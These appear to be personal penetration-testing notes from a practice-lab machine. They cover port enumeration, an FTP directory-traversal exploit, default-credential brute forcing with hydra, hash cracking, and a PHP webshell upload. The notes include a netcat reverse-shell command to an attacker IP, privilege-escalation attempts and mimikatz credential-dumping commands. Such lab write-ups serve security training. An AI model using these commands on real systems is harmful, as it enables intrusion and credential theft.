### Enumeration
```
IP=192.168.239.46
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p21,242,3145,3389 -A $IP
```
#### Ports 
- 21
	- zFTPServer 6.0 build 2011-10-17
		- exploit-db 18235
			- directory traversal
			- `./18235.pl $IP 96`
			- rmdir failed access denied
			- changed to admin:admin
				- still rmdir failed access denied
- 242
	- Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
- 3145
	- zFTPServer admin
- 3389
	- ssl/ms-wbt-server
- OS: Windows 2008
### Foothold
- 21
	- ftp anonymous@$IP
		- Successful
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
		- admin:admin
			- successful
	- Accounts
		- backup
		- offsec
		- anonymous
		- admin
	- ftp admin@$IP
		- index.php
		- .htpasswd
			- `offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0`
			- hashcat -m 1600 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/phpbb.txt
				- elite
		- .htaccess
		- allows us to put php webshell in
- 242
	- ![[Pasted image 20240701095957.png]]
	- Tried
		- anonymous:anonymous
		- admin:admin
	- Able to get logged into with offsec:elite
	- navigate to webshell.php
		- ![[Pasted image 20240701102915.png]]
		- put a base64 ps1 rev shell > not recognized
		- Put php rev shell in ftp server  >  not working
		- Put nc.exe in ftp server. Used this command to get RCE: `nc.exe 192.168.45.195 8000 -e cmd`
- 3145
	- Loads forever
### PE
- `livda\apache
	- whoami /all
		- SeImpersonatePrivilege enable
			- PrintSpoofer32.exe  did not work
		- SeChangeNotifyPrivilege enable
		- SeCreateGlobalPrivilege enable
	- systeminfo
		- Windows Serverr 2008 6.0.6001 Service Pack 1 Build 6001
		- X86-based
		- python2 windows-exploit-suggester.py --database 2024-07-01-mssb.xls --systeminfo systeminfo.txt
			- nothing
		- ./wes.py ~/OSCP/exploits/windows/Windows-Exploit-Suggester/systeminfo.txt > ~/OSCP/boxes/authby/systeminfo_exploits.txt
			- Alots of exploits
		- Google Windows Server 2008 6.0.6001
			- ms11-046 - exploitdb 40564
			- ![[Pasted image 20240701111754.png]]
			- ![[Pasted image 20240701111801.png]]
	- Unquoted
		- cmd
			- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
				- wampmysqld
					- `c:\wamp\bin\mysql\mysql5.5.16\bin\mysqld.exe wampmysqld`
				- zFTPSvc
					- `C:\Program Files\zFTPServer\zFTPServer.exe /service`
		- icacls Filepath before .exe
			- Looking for W or F
	- /Users
		- Administrator
		- apache
		- Public
	- /ManageEngine/ServiceDesk
		- /archive
			- empty
		- /backup
			-  A few backup files
			- Unreadable with type
		- /dict
			- en_US.zip
		- /logs
			- create logs
		- /scannedxmls
			- empty
	- mimikatz
		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
			- unable to elevate
		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
			- unable to elevate
### Lessons Learned
- For windows exploits. Use google first then try exploit suggester
- Try all valid creds everywhere and see what sticks